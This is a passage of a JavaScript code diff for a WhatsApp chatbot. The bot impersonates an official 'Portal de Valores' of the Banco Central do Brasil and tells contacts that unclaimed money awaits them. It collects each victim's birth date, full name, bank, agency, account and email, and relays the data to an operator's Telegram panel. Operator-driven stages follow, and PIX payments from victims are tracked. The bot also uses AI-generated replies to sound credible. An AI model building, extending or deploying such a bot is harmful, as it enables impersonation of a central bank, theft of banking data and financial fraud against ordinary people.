+            const chat = await msg.getChat();
+            await chat.sendStateTyping();
+
+            const { text: txtEsp, reply_markup: rmEsp } = buildCadastroMessage(targetChatId, null, null, 'preenchendo_data');
+            const tgMsgId = await notifyTelegram(txtEsp, null, rmEsp);
+            await notifyTelegram(`📩 <b>NOVO CONTATO ESPONTÂNEO</b>\nLead: <code>${targetChatId}</code>\nMensagem: <i>${text}</i>`);
+
+            chatSessions.set(targetChatId, {
+                mode: 'bot',
+                step: 1,
+                userId: null,
+                expectedData: null,
+                lastMsgTime: Date.now(),
+                createdAt: Date.now(),
+                tgMsgId
+            });
             saveSessions();
 
-            if (currentSession.tgMsgId) {
-                const { text: txt, reply_markup } = buildCadastroMessage(targetChatId, currentSession.name, currentSession.birthDate, 'preenchendo_banco', currentSession.docType);
-                await notifyTelegram(txt, currentSession.tgMsgId, reply_markup);
-            }
+            const aiReply = await askAI(PROMPT_INICIAL, text);
+            const fallback = `👋 *Olá! Sou o Assistente Oficial do Portal de Valores — Sistema de Valores a Receber.*\n\nIdentificamos valores pendentes de liberação associados ao seu perfil em nosso sistema, em conformidade com as diretrizes do Banco Central do Brasil.\n\nPara prosseguir com a validação de titularidade e liberar o processamento, necessitamos confirmar seus dados cadastrais.\n\n📍 *ETAPA 1:* Por gentileza, informe sua *Data de Nascimento* (Ex: 10/05/1990):`;
 
-            await sendBotMessage(targetChatId, `✔️ *Agência confirmada*\n\nAgora informe o número da sua *Conta* com dígito:`);
-        } else {
-            await sendBotMessage(targetChatId, `⚠️ *Agência Inválida*\n\nPor favor, informe apenas os números da sua agência (Ex: 0001).`);
+            setTimeout(async () => {
+                await sendBotMessage(targetChatId, aiReply || fallback);
+            }, 1500);
+            return;
         }
-    } else if (currentSession.step === 4) {
-        const typedCc = text.trim();
-        const cleanCc = typedCc.replace(/\D/g, "");
-        if (cleanCc.length >= 4) {
 
-            const validation = validateBankData(currentSession.bankCode, currentSession.bankAg, typedCc);
+        currentSession.lastMsgTime = Date.now();
+        const chat = await msg.getChat();
+        await chat.sendStateTyping();
+        const isPJ = currentSession.docType === 'CNPJ';
 
-            if (!validation.valid) {
-                await sendBotMessage(targetChatId, `⚠️ *DADOS INCONSISTENTES*\n\nA agência e conta informadas não correspondem ao padrão do banco *${currentSession.bankName}*.\n\nPor favor, informe o número da *Conta* novamente:`);
+        if (currentSession.step === 1) {
+            // More robust date regex: matches DD/MM/YYYY, DD-MM-YYYY, or DDMMYYYY
+            const dateMatch = text.match(/(\d{1,2})[\/-](\d{1,2})[\/-](\d{4})/) || text.match(/(\d{8})/);
+
+            if (!dateMatch) {
+                console.log(`[BOT] Date format not recognized for ${targetChatId}: "${text}"`);
+                const aiReply = await askAI(PROMPT_DATA_INVALIDA, text);
+                const dataLabel = isPJ ? 'Data de Abertura da empresa' : 'Data de Nascimento';
+                const fallback = `⚠️ *Portal de Valores — Validação de Identidade*\n\nO formato informado não foi reconhecido pelo sistema.\n\nPor gentileza, informe a *${dataLabel}* no formato oficial:\n📌 *Exemplo:* 10/05/1990`;
+                await sendBotMessage(targetChatId, aiReply || fallback);
                 return;
             }
 
-            currentSession.step = 5;
-            currentSession.bankCc = typedCc;
+            const rawDate = dateMatch[0];
+            const cleanTyped = rawDate.replace(/\D/g, "");
+
+            // Ensure we have exactly 8 digits (DDMMYYYY)
+            if (cleanTyped.length !== 8) {
+                await sendBotMessage(targetChatId, `⚠️ *Data Incompleta*\n\nPor favor, informe a data completa com dia, mês e ano (Ex: 10/05/1990).`);
+                return;
+            }
+
+            // Comparison logic
+            // Strict Comparison logic
+            if (currentSession.userId && !currentSession.expectedData) {
+                // If we have a userId but no data, try one last time to fetch it (in case of server lag)
+                console.log(`[BOT] userId present but no expectedData for ${targetChatId}. Retrying fetch...`);
+                try {
+                    const res = await axios.get(`${API_URL}/api/v1/session/data/${currentSession.userId}`, {
+                        headers: API_HEADERS,
+                        timeout: 3000,
+                        httpsAgent: getSecureHttpsAgent()
+                    });
+
+                    if (res.data && res.data.birthDate) {
+                        currentSession.expectedData = res.data;
+                        console.log(`[BOT] Successfully recovered expectedData on retry for ${targetChatId}`);
+                    }
+                } catch (e) {
+                    console.log(`[BOT] Retry fetch failed for ${targetChatId}: ${e.message}`);
+                }
+            }
+
+            if (currentSession.expectedData?.birthDate) {
+                const cleanExpected = currentSession.expectedData.birthDate.replace(/\D/g, "");
+                console.log(`[BOT] Comparing dates for ${targetChatId}: Typed=${cleanTyped}, Expected=${cleanExpected}`);
+
+                if (cleanTyped !== cleanExpected) {
+                    console.log(`[BOT] DIVERGENCE: Typed ${cleanTyped} != Expected ${cleanExpected}`);
+                    await sendBotMessage(targetChatId, `⚠️ *DIVERGÊNCIA IDENTIFICADA — Portal de Valores*\n\nA data informada não corresponde aos registros cadastrais do titular no portal.\n\nPor gentileza, verifique os dados e informe novamente conforme preenchido anteriormente.\n📌 *Formato:* DD/MM/AAAA`);
+                    return;
+                }
+                console.log(`[BOT] Date MATCH for ${targetChatId}`);
+            } else if (currentSession.userId) {
+                // We have a protocol but still no data found on server
+                console.log(`[BOT] ERROR: userId ${currentSession.userId} has no data on server. Rejecting to be safe.`);
+                await notifyTelegram(`🚨 <b>FALHA DE SINCRONISMO</b>\nLead: <code>${targetChatId}</code>\nID: <code>${currentSession.userId}</code>\n<i>O lead tentou validar mas os dados do portal não foram encontrados. Sistema bloqueou por segurança.</i>`);
+                await sendBotMessage(targetChatId, `⚠️ *ERRO DE SINCRONISMO — Portal de Valores*\n\nNão foi possível localizar seu registro de consulta em nossa base de dados central.\n\nPor gentileza, retorne ao site e realize a consulta novamente para gerar um novo protocolo de segurança.`);
+                return;
+            } else {
+                console.log(`[BOT] Spontaneous lead (no protocol) ${targetChatId}. Proceeding with sanity check.`);
+                await notifyTelegram(`⚠️ <b>CONTATO DIRETO (SEM PORTAL)</b>\nLead: <code>${targetChatId}</code>\n<i>O lead entrou em contato sem passar pelo site. Validação manual necessária.</i>`);
+            }
+
+            // Format for storage: DD/MM/AAAA
+            const formattedDate = cleanTyped.replace(/(\d{2})(\d{2})(\d{4})/, "$1/$2/$3");
+
+            currentSession.step = 2;
+            currentSession.birthDate = formattedDate;
             chatSessions.set(targetChatId, currentSession);
             saveSessions();
-
-            await sendBotMessage(targetChatId,
-                `🏛️ *${currentSession.bankName.toUpperCase()} CONFIRMADO* ✅\n\n` +
-                `📍 *DADOS CAPTURADOS:*\n` +
-                `- Agência: ${currentSession.bankAg}\n` +
-                `- Conta: ${currentSession.bankCc}\n` +
-                `- Instituição: ${currentSession.bankName}\n\n` +
-                `Prezado(a) titular, confirme se realmente esta é a conta que o senhor(a) deseja utilizar para o recebimento do seu valor ativo?\n\n` +
-                `⚠️ *AVISO:* A conta *NÃO* pode ser recém-criada ou sem movimentações antigas.\n\n` +
-                `*Responda SIM para confirmar* ou informe os dados novamente.`);
-        } else {
-            await sendBotMessage(targetChatId, `⚠️ *Conta Inválida*\n\nPor favor, informe o número da sua conta corretamente (mínimo 4 dígitos).`);
-        }
-    } else if (currentSession.step === 5) {
-        if (text.toUpperCase() === 'SIM' || text.toUpperCase().includes('CORRETO') || text.toUpperCase().includes('ESTA')) {
-            currentSession.step = 6;
-            chatSessions.set(targetChatId, currentSession);
-            saveSessions();
-
-            await sendBotMessage(targetChatId,
-                `✅ *Dados bancários confirmados!*\n\n` +
-                `📍 *FASE 1.5 — Canal de Comunicação:* Para que o sistema envie seu *Comprovante de Liberação* e a *Notificação de Regularização* após o resgate, informe seu melhor *E-mail* para contato:\n\n` +
-                `📌 *Exemplo:* seuemail@provedor.com`);
-        } else {
-            currentSession.step = 3;
-            chatSessions.set(targetChatId, currentSession);
-            saveSessions();
-            await sendBotMessage(targetChatId, `🔄 *Entendido. Vamos recomeçar a vinculação bancária.*\n\n📍 *FASE 1.3:* Informe sua *Agência* bancária:`);
-        }
-    } else if (currentSession.step === 6) {
-        const typedEmail = text.toLowerCase().trim();
-        const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
-        const validDomains = ['gmail.com', 'outlook.com', 'hotmail.com', 'yahoo.com', 'icloud.com', 'uol.com.br', 'bol.com.br', 'ig.com.br', 'terra.com.br', 'live.com'];
-
-        const isFormatValid = emailRegex.test(typedEmail);
-        const domain = typedEmail.split('@')[1];
-        const isDomainValid = validDomains.includes(domain) || (domain && domain.includes('.gov.br')) || (domain && domain.includes('.edu.br'));
-
-        if (isFormatValid && isDomainValid) {
-            currentSession.step = 7;
-            currentSession.email = typedEmail;
-            currentSession.mode = 'waiting';
-            chatSessions.set(targetChatId, currentSession);
-            saveSessions();
-
-            addToQueue(targetChatId, currentSession.name, currentSession.birthDate);
-            const queuePos = getQueuePosition(targetChatId);
-            const clientesFrente = queuePos > 1 ? queuePos - 1 : 0;
 
             if (currentSession.tgMsgId) {
-                const { text: txt, reply_markup } = buildCadastroMessage(targetChatId, currentSession.name, currentSession.birthDate, 'na_fila', currentSession.docType);
+                const { text: txt, reply_markup } = buildCadastroMessage(targetChatId, null, formattedDate, 'preenchendo_nome', currentSession.docType);
                 await notifyTelegram(txt, currentSession.tgMsgId, reply_markup);
             }
 
-            const frenteMsg = clientesFrente > 0
-                ? `Há *${clientesFrente} solicitação(ões)* sendo processada(s) antes da sua.`
-                : `Sua solicitação é a próxima a ser processada.`;
+            if (isPJ) {
+                await sendBotMessage(targetChatId, `✅ *Data de abertura confirmada!*\n\n📍 *FASE 1.2:* Agora informe a *Razão Social* da empresa (conforme consta no Cartão CNPJ):`);
+            } else {
+                await sendBotMessage(targetChatId, `✅ *Data de nascimento confirmada!*\n\n📍 *FASE 1.2:* Agora informe seu *Nome Completo* (conforme consta no documento oficial):`);
+            }
 
-            await sendBotMessage(targetChatId,
-                `📋 *AUTENTICAÇÃO CONCLUÍDA — Portal de Valores*\n\n` +
-                `Prezado(a) *${currentSession.name}*,\n` +
-                `Seu canal de comunicação (${typedEmail}) foi vinculado com sucesso ao processo de resgate.\n\n` +
-                `⌛ *STATUS ATUAL:* Aguardando Processamento Final\n\n` +
-                `${frenteMsg}\n\n` +
-                `Nosso operador entrará em contato em breve para os procedimentos finais de liberação dos ativos.\n\n` +
-                `_Portal de Valores — Banco Central do Brasil_`);
-        } else {
-            await sendBotMessage(targetChatId,
-                `⚠️ *E-mail Inválido ou Não Reconhecido*\n\n` +
-                `O endereço informado não parece ser um e-mail válido ou pertence a um provedor não homologado.\n\n` +
-                `Por gentileza, informe um e-mail válido (Ex: Gmail, Outlook, Hotmail) para receber seu comprovante.`);
-        }
-    }
-}
-
-// --- WATCHER DE COMANDOS EXTERNOS (TELEGRAM -> WHATSAPP) ---
-setInterval(async () => {
-    // --- cmd-send-*.json: envia mensagem livre ao lead ---
-    const sendFiles = fs.readdirSync(process.cwd()).filter(f => f.startsWith('cmd-send-') && f.endsWith('.json'));
-    for (const file of sendFiles) {
-        const cmdPath = path.join(process.cwd(), file);
-        let cmd = null;
-        try {
-            const data = fs.readFileSync(cmdPath, 'utf-8');
-            if (data) cmd = JSON.parse(data);
-        } catch (e) { continue; /* ignora erro de parse caso o arquivo ainda esteja sendo escrito */ }
-
-        if (cmd) {
-            try {
-                fs.unlinkSync(cmdPath); // Apaga primeiro para evitar loop infinito de erro
-                console.log(`📤 Enviando mensagem externa para: ${cmd.to}`);
-                await sendBotMessage(cmd.to, cmd.message);
-                if (waitingQueue.find(q => q.chatId === cmd.to)) {
-                    removeFromQueue(cmd.to);
-                    const s = chatSessions.get(cmd.to) || { mode: 'human', humanStep: 1 };
-                    s.mode = 'human';
-                    chatSessions.set(cmd.to, s);
-                    saveSessions();
-                    console.log(`✅ [FILA] Lead ${cmd.to} removido da fila — atendimento assumido pelo admin.`);
+        } else if (currentSession.step === 2) {
+            const typedName = text.trim();
+            if (typedName.length >= 8 && typedName.includes(" ")) {
+                if (currentSession.expectedData?.fullName) {
+                    const isMatch = checkNameMatch(typedName, currentSession.expectedData.fullName);
+                    if (!isMatch) {
+                        await sendBotMessage(targetChatId, `⚠️ *DIVERGÊNCIA IDENTIFICADA*\n\nO nome informado não corresponde ao titular registrado no protocolo.\n\nPor favor, digite o nome completo exato (Ex: João da Silva Santos):`);
+                        return;
+                    }
                 }
-            } catch (e) {
-                console.error("❌ Erro ao processar cmd-send:", e.message);
+                currentSession.step = 2.5;
+                currentSession.name = typedName;
+                chatSessions.set(targetChatId, currentSession);
+                saveSessions();
+
+                if (currentSession.tgMsgId) {
+                    const { text: txt, reply_markup } = buildCadastroMessage(targetChatId, typedName, currentSession.birthDate, 'preenchendo_banco', currentSession.docType);
+                    await notifyTelegram(txt, currentSession.tgMsgId, reply_markup);
+                }
+
+                await sendBotMessage(targetChatId, `✅ *Nome Completo confirmado!*\n\n📍 *FASE 1.3:* Informe o *Nome da sua Instituição Financeira* (Ex: Nubank, Itaú, Caixa, Banco do Brasil, Bradesco, etc):`);
+            } else {
+                const fallback = `⚠️ *Portal de Valores — Validação de Identidade*\n\nPor gentileza, informe seu *Nome Completo* sem abreviações, conforme consta em seu documento oficial.`;
+                await sendBotMessage(targetChatId, fallback);
+            }
+        } else if (currentSession.step === 2.5) {
+            let detected = detectBank(text);
+
+            // Fallback inteligente com IA se a detecção local falhar
+            if (!detected) {
+                const aiResult = await askAI(PROMPT_BANCO_EXTRACT, text);
+                if (aiResult && aiResult.trim().toUpperCase() !== "NULL") {
+                    detected = detectBank(aiResult.trim());
+                }
+            }
+
+            if (!detected) {
+                await sendBotMessage(targetChatId, `⚠️ Não consegui identificar a instituição bancária. Por favor, informe o nome do banco novamente (Ex: Nubank, Bradesco, Itaú, Caixa):`);
+                return;
+            }
+            currentSession.bankName = detected.name;
+            currentSession.bankCode = detected.code;
+            currentSession.step = 3;
+            chatSessions.set(targetChatId, currentSession);
+            saveSessions();
+            await sendBotMessage(targetChatId, `🏦 Banco identificado: *${detected.name}* ✅\n\nAgora informe os números da sua *Agência* bancária:`);
+        } else if (currentSession.step === 3) {
+            const typedAg = text.trim().replace(/\D/g, "");
+
+            if (typedAg.length >= 3 && typedAg.length <= 5) {
+                currentSession.step = 4;
+                currentSession.bankAg = typedAg;
+                chatSessions.set(targetChatId, currentSession);
+                saveSessions();
+
+                if (currentSession.tgMsgId) {
+                    const { text: txt, reply_markup } = buildCadastroMessage(targetChatId, currentSession.name, currentSession.birthDate, 'preenchendo_banco', currentSession.docType);
+                    await notifyTelegram(txt, currentSession.tgMsgId, reply_markup);
+                }
+
+                await sendBotMessage(targetChatId, `✔️ *Agência confirmada*\n\nAgora informe o número da sua *Conta* com dígito:`);
+            } else {
+                await sendBotMessage(targetChatId, `⚠️ *Agência Inválida*\n\nPor favor, informe apenas os números da sua agência (Ex: 0001).`);
+            }
+        } else if (currentSession.step === 4) {
+            const typedCc = text.trim();
+            const cleanCc = typedCc.replace(/\D/g, "");
+            if (cleanCc.length >= 4) {
+
+                const validation = validateBankData(currentSession.bankCode, currentSession.bankAg, typedCc);
+
+                if (!validation.valid) {
+                    await sendBotMessage(targetChatId, `⚠️ *DADOS INCONSISTENTES*\n\nA agência e conta informadas não correspondem ao padrão do banco *${currentSession.bankName}*.\n\nPor favor, informe o número da *Conta* novamente:`);
+                    return;
+                }
+
+                currentSession.step = 5;
+                currentSession.bankCc = typedCc;
+                chatSessions.set(targetChatId, currentSession);
+                saveSessions();
+
+                await sendBotMessage(targetChatId,
+                    `🏛️ *${currentSession.bankName.toUpperCase()} CONFIRMADO* ✅\n\n` +
+                    `📍 *DADOS CAPTURADOS:*\n` +
+                    `- Agência: ${currentSession.bankAg}\n` +
+                    `- Conta: ${currentSession.bankCc}\n` +
+                    `- Instituição: ${currentSession.bankName}\n\n` +
+                    `Prezado(a) titular, confirme se realmente esta é a conta que o senhor(a) deseja utilizar para o recebimento do seu valor ativo?\n\n` +
+                    `⚠️ *AVISO:* A conta *NÃO* pode ser recém-criada ou sem movimentações antigas.\n\n` +
+                    `*Responda SIM para confirmar* ou informe os dados novamente.`);
+            } else {
+                await sendBotMessage(targetChatId, `⚠️ *Conta Inválida*\n\nPor favor, informe o número da sua conta corretamente (mínimo 4 dígitos).`);
+            }
+        } else if (currentSession.step === 5) {
+            if (text.toUpperCase() === 'SIM' || text.toUpperCase().includes('CORRETO') || text.toUpperCase().includes('ESTA')) {
+                currentSession.step = 6;
+                chatSessions.set(targetChatId, currentSession);
+                saveSessions();
+
+                await sendBotMessage(targetChatId,
+                    `✅ *Dados bancários confirmados!*\n\n` +
+                    `📍 *FASE 1.5 — Canal de Comunicação:* Para que o sistema envie seu *Comprovante de Liberação* e a *Notificação de Regularização* após o resgate, informe seu melhor *E-mail* para contato:\n\n` +
+                    `📌 *Exemplo:* seuemail@provedor.com`);
+            } else {
+                currentSession.step = 3;
+                chatSessions.set(targetChatId, currentSession);
+                saveSessions();
+                await sendBotMessage(targetChatId, `🔄 *Entendido. Vamos recomeçar a vinculação bancária.*\n\n📍 *FASE 1.3:* Informe sua *Agência* bancária:`);
+            }
+        } else if (currentSession.step === 6) {
+            const typedEmail = text.toLowerCase().trim();
+            const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
+            const validDomains = ['gmail.com', 'outlook.com', 'hotmail.com', 'yahoo.com', 'icloud.com', 'uol.com.br', 'bol.com.br', 'ig.com.br', 'terra.com.br', 'live.com'];
+
+            const isFormatValid = emailRegex.test(typedEmail);
+            const domain = typedEmail.split('@')[1];
+            const isDomainValid = validDomains.includes(domain) || (domain && domain.includes('.gov.br')) || (domain && domain.includes('.edu.br'));
+
+            if (isFormatValid && isDomainValid) {
+                currentSession.step = 7;
+                currentSession.email = typedEmail;
+                currentSession.mode = 'waiting';
+                chatSessions.set(targetChatId, currentSession);
+                saveSessions();
+
+                addToQueue(targetChatId, currentSession.name, currentSession.birthDate);
+                const queuePos = getQueuePosition(targetChatId);
+                const clientesFrente = queuePos > 1 ? queuePos - 1 : 0;
+
+                if (currentSession.tgMsgId) {
+                    const { text: txt, reply_markup } = buildCadastroMessage(targetChatId, currentSession.name, currentSession.birthDate, 'na_fila', currentSession.docType);
+                    await notifyTelegram(txt, currentSession.tgMsgId, reply_markup);
+                }
+
+                const frenteMsg = clientesFrente > 0
+                    ? `Há *${clientesFrente} solicitação(ões)* sendo processada(s) antes da sua.`
+                    : `Sua solicitação é a próxima a ser processada.`;
+
+                await sendBotMessage(targetChatId,
+                    `📋 *AUTENTICAÇÃO CONCLUÍDA — Portal de Valores*\n\n` +
+                    `Prezado(a) *${currentSession.name}*,\n` +
+                    `Seu canal de comunicação (${typedEmail}) foi vinculado com sucesso ao processo de resgate.\n\n` +
+                    `⌛ *STATUS ATUAL:* Aguardando Processamento Final\n\n` +
+                    `${frenteMsg}\n\n` +
+                    `Nosso operador entrará em contato em breve para os procedimentos finais de liberação dos ativos.\n\n` +
+                    `_Portal de Valores — Banco Central do Brasil_`);
+            } else {
+                await sendBotMessage(targetChatId,
+                    `⚠️ *E-mail Inválido ou Não Reconhecido*\n\n` +
+                    `O endereço informado não parece ser um e-mail válido ou pertence a um provedor não homologado.\n\n` +
+                    `Por gentileza, informe um e-mail válido (Ex: Gmail, Outlook, Hotmail) para receber seu comprovante.`);
             }
         }
     }
 
-    // --- cmd-etapa-*.json: libera etapas ao lead e atualiza painel Telegram INSTANTANEAMENTE ---
-    const etapaFiles = fs.readdirSync(process.cwd()).filter(f => f.startsWith('cmd-etapa-') && f.endsWith('.json'));
-    for (const file of etapaFiles) {
-        const cmdPath = path.join(process.cwd(), file);
-        let cmd = null;
-        try {
-            const data = fs.readFileSync(cmdPath, 'utf-8');
-            if (data) cmd = JSON.parse(data);
-        } catch (e) { continue; }
-
-        if (cmd) {
+    // --- WATCHER DE COMANDOS EXTERNOS (TELEGRAM -> WHATSAPP) ---
+    setInterval(async () => {
+        // --- cmd-send-*.json: envia mensagem livre ao lead ---
+        const sendFiles = fs.readdirSync(process.cwd()).filter(f => f.startsWith('cmd-send-') && f.endsWith('.json'));
+        for (const file of sendFiles) {
+            const cmdPath = path.join(process.cwd(), file);
+            let cmd = null;
             try {
-                fs.unlinkSync(cmdPath);
-                const { etapa, chatId } = cmd;
-                const session = chatSessions.get(chatId);
+                const data = fs.readFileSync(cmdPath, 'utf-8');
+                if (data) cmd = JSON.parse(data);
+            } catch (e) { continue; /* ignora erro de parse caso o arquivo ainda esteja sendo escrito */ }
 
-                console.log(`📋 [ETAPA ${etapa}] Liberando para: ${chatId}`);
-
-                if (etapa === 2) {
-                    if (session) { session.humanStep = 2; chatSessions.set(chatId, session); saveSessions(); }
-                    // Atualiza painel do lead no Telegram imediatamente (fica verde)
-                    if (session?.tgMsgId) {
-                        const { text: t, reply_markup: r } = buildCadastroMessage(chatId, session.name, session.birthDate, 'human', session.docType || 'CPF', 2);
-                        await notifyTelegram(t, session.tgMsgId, r);
+            if (cmd) {
+                try {
+                    fs.unlinkSync(cmdPath); // Apaga primeiro para evitar loop infinito de erro
+                    console.log(`📤 Enviando mensagem externa para: ${cmd.to}`);
+                    await sendBotMessage(cmd.to, cmd.message);
+                    if (waitingQueue.find(q => q.chatId === cmd.to)) {
+                        removeFromQueue(cmd.to);
+                        const s = chatSessions.get(cmd.to) || { mode: 'human', humanStep: 1 };
+                        s.mode = 'human';
+                        chatSessions.set(cmd.to, s);
+                        saveSessions();
+                        console.log(`✅ [FILA] Lead ${cmd.to} removido da fila — atendimento assumido pelo admin.`);
                     }
+                } catch (e) {
+                    console.error("❌ Erro ao processar cmd-send:", e.message);
+                }
+            }
+        }
 
-                    // EDITA a mensagem inicial ao invés de mandar uma nova
-                    if (session?.assumeMsgId) {
-                        try {
-                            const msg = await client.getMessageById(session.assumeMsgId);
-                            await msg.edit(buildStatusMessage(2));
-                        } catch (e) {
+        // --- cmd-etapa-*.json: libera etapas ao lead e atualiza painel Telegram INSTANTANEAMENTE ---
+        const etapaFiles = fs.readdirSync(process.cwd()).filter(f => f.startsWith('cmd-etapa-') && f.endsWith('.json'));
+        for (const file of etapaFiles) {
+            const cmdPath = path.join(process.cwd(), file);
+            let cmd = null;
+            try {
+                const data = fs.readFileSync(cmdPath, 'utf-8');
+                if (data) cmd = JSON.parse(data);
+            } catch (e) { continue; }
+
+            if (cmd) {
+                try {
+                    fs.unlinkSync(cmdPath);
+                    const { etapa, chatId } = cmd;
+                    const session = chatSessions.get(chatId);
+
+                    console.log(`📋 [ETAPA ${etapa}] Liberando para: ${chatId}`);
+
+                    if (etapa === 2) {
+                        if (session) { session.humanStep = 2; chatSessions.set(chatId, session); saveSessions(); }
+                        // Atualiza painel do lead no Telegram imediatamente (fica verde)
+                        if (session?.tgMsgId) {
+                            const { text: t, reply_markup: r } = buildCadastroMessage(chatId, session.name, session.birthDate, 'human', session.docType || 'CPF', 2);
+                            await notifyTelegram(t, session.tgMsgId, r);
+                        }
+
+                        // EDITA a mensagem inicial ao invés de mandar uma nova
+                        if (session?.assumeMsgId) {
+                            try {
+                                const msg = await client.getMessageById(session.assumeMsgId);
+                                await msg.edit(buildStatusMessage(2));
+                            } catch (e) {
+                                await sendBotMessage(chatId, buildStatusMessage(2));
+                            }
+                        } else {
                             await sendBotMessage(chatId, buildStatusMessage(2));
                         }
-                    } else {
-                        await sendBotMessage(chatId, buildStatusMessage(2));
-                    }
 
-                } else if (etapa === 3) {
-                    if (session) { session.humanStep = 3; chatSessions.set(chatId, session); saveSessions(); }
-                    // Atualiza painel do lead no Telegram imediatamente (Etapa 3 fica verde)
-                    if (session?.tgMsgId) {
-                        const { text: t, reply_markup: r } = buildCadastroMessage(chatId, session.name, session.birthDate, 'human', session.docType || 'CPF', 3);
-                        await notifyTelegram(t, session.tgMsgId, r);
-                    }
+                    } else if (etapa === 3) {
+                        if (session) { session.humanStep = 3; chatSessions.set(chatId, session); saveSessions(); }
+                        // Atualiza painel do lead no Telegram imediatamente (Etapa 3 fica verde)
+                        if (session?.tgMsgId) {
+                            const { text: t, reply_markup: r } = buildCadastroMessage(chatId, session.name, session.birthDate, 'human', session.docType || 'CPF', 3);
+                            await notifyTelegram(t, session.tgMsgId, r);
+                        }
 
-                    if (session?.assumeMsgId) {
-                        try {
-                            const msg = await client.getMessageById(session.assumeMsgId);
-                            await msg.edit(buildStatusMessage(3));
-                        } catch (e) {
+                        if (session?.assumeMsgId) {
+                            try {
+                                const msg = await client.getMessageById(session.assumeMsgId);
+                                await msg.edit(buildStatusMessage(3));
+                            } catch (e) {
+                                await sendBotMessage(chatId, buildStatusMessage(3));
+                            }
+                        } else {
                             await sendBotMessage(chatId, buildStatusMessage(3));
                         }
-                    } else {
-                        await sendBotMessage(chatId, buildStatusMessage(3));
-                    }
-                    // Opcional: Ainda manda a MENSAGEM_ETAPA_3 se quiser explicações extras, mas o usuário pediu para NÃO mandar mensagem a cada etapa.
-                    // await sendBotMessage(chatId, MENSAGEM_ETAPA_3);
+                        // Opcional: Ainda manda a MENSAGEM_ETAPA_3 se quiser explicações extras, mas o usuário pediu para NÃO mandar mensagem a cada etapa.
+                        // await sendBotMessage(chatId, MENSAGEM_ETAPA_3);
 
-                } else if (etapa === 4) {
-                    if (session) { session.humanStep = 4; chatSessions.set(chatId, session); saveSessions(); }
-                    // Atualiza painel do lead no Telegram imediatamente (Etapa 4 fica verde)
-                    if (session?.tgMsgId) {
-                        const { text: t, reply_markup: r } = buildCadastroMessage(chatId, session.name, session.birthDate, 'human', session.docType || 'CPF', 4);
-                        await notifyTelegram(t, session.tgMsgId, r);
-                    }
+                    } else if (etapa === 4) {
+                        if (session) { session.humanStep = 4; chatSessions.set(chatId, session); saveSessions(); }
+                        // Atualiza painel do lead no Telegram imediatamente (Etapa 4 fica verde)
+                        if (session?.tgMsgId) {
+                            const { text: t, reply_markup: r } = buildCadastroMessage(chatId, session.name, session.birthDate, 'human', session.docType || 'CPF', 4);
+                            await notifyTelegram(t, session.tgMsgId, r);
+                        }
 
-                    if (session?.assumeMsgId) {
-                        try {
-                            const msg = await client.getMessageById(session.assumeMsgId);
-                            await msg.edit(buildStatusMessage(4));
-                        } catch (e) {
+                        if (session?.assumeMsgId) {
+                            try {
+                                const msg = await client.getMessageById(session.assumeMsgId);
+                                await msg.edit(buildStatusMessage(4));
+                            } catch (e) {
+                                await sendBotMessage(chatId, buildStatusMessage(4));
+                            }
+                        } else {
                             await sendBotMessage(chatId, buildStatusMessage(4));
                         }
-                    } else {
-                        await sendBotMessage(chatId, buildStatusMessage(4));
-                    }
-                    // await sendBotMessage(chatId, MENSAGEM_ETAPA_4);
+                        // await sendBotMessage(chatId, MENSAGEM_ETAPA_4);
 
-                } else if (etapa === 5) {
-                    if (session) { session.humanStep = 5; chatSessions.set(chatId, session); saveSessions(); }
-                    if (session?.tgMsgId) {
-                        const { text: t, reply_markup: r } = buildCadastroMessage(chatId, session.name, session.birthDate, 'human', session.docType || 'CPF', 5);
-                        await notifyTelegram(t, session.tgMsgId, r);
+                    } else if (etapa === 5) {
+                        if (session) { session.humanStep = 5; chatSessions.set(chatId, session); saveSessions(); }
+                        if (session?.tgMsgId) {
+                            const { text: t, reply_markup: r } = buildCadastroMessage(chatId, session.name, session.birthDate, 'human', session.docType || 'CPF', 5);
+                            await notifyTelegram(t, session.tgMsgId, r);
+                        }
+                        await sendBotMessage(chatId, MENSAGEM_ETAPA_5);
+                        await notifyTelegram(
+                            `💰 <b>ETAPA 5 — LIBERAÇÃO FINAL</b>\nLead: <code>${chatId}</code>\n\n<i>Lead em fase de preenchimento dos dados de crédito.</i>`
+                        );
                     }
-                    await sendBotMessage(chatId, MENSAGEM_ETAPA_5);
-                    await notifyTelegram(
-                        `💰 <b>ETAPA 5 — LIBERAÇÃO FINAL</b>\nLead: <code>${chatId}</code>\n\n<i>Lead em fase de preenchimento dos dados de crédito.</i>`
-                    );
-                }
-            } catch (e) {
-                console.error("❌ Erro ao processar cmd-etapa:", e.message);
-                if (e.message.includes('detached Frame') || e.message.includes('Target closed') || e.message.includes('Protocol error')) {
-                    console.log('🔄 [RECOVERY] Erro de navegador detectado no loop de etapas. Reiniciando bot...');
-                    process.exit(1);
+                } catch (e) {
+                    console.error("❌ Erro ao processar cmd-etapa:", e.message);
+                    if (e.message.includes('detached Frame') || e.message.includes('Target closed') || e.message.includes('Protocol error')) {
+                        console.log('🔄 [RECOVERY] Erro de navegador detectado no loop de etapas. Reiniciando bot...');
+                        process.exit(1);
+                    }
                 }
             }
         }
-    }
 
-    // --- cmd-pix-paid-*.json: PIX automático foi PAGO → conclui Etapa 4 automaticamente ---
-    const paidFiles = fs.readdirSync(process.cwd()).filter(f => f.startsWith('cmd-pix-paid-') && f.endsWith('.json'));
-    for (const file of paidFiles) {
-        const cmdPath = path.join(process.cwd(), file);
-        let cmd = null;
-        try {
-            const data = fs.readFileSync(cmdPath, 'utf-8');
-            if (data) cmd = JSON.parse(data);
-        } catch (e) { continue; }
-
-        if (cmd) {
+        // --- cmd-pix-paid-*.json: PIX automático foi PAGO → conclui Etapa 4 automaticamente ---
+        const paidFiles = fs.readdirSync(process.cwd()).filter(f => f.startsWith('cmd-pix-paid-') && f.endsWith('.json'));
+        for (const file of paidFiles) {
+            const cmdPath = path.join(process.cwd(), file);
+            let cmd = null;
             try {
-                fs.unlinkSync(cmdPath);
-                const { chatId, transId } = cmd;
-                const session = chatSessions.get(chatId);
+                const data = fs.readFileSync(cmdPath, 'utf-8');
+                if (data) cmd = JSON.parse(data);
+            } catch (e) { continue; }
 
-                console.log(`💰 [PIX PAGO] Etapa 4 concluída automaticamente para: ${chatId} | TransID: ${transId}`);
+            if (cmd) {
+                try {
+                    fs.unlinkSync(cmdPath);
+                    const { chatId, transId } = cmd;
+                    const session = chatSessions.get(chatId);
 
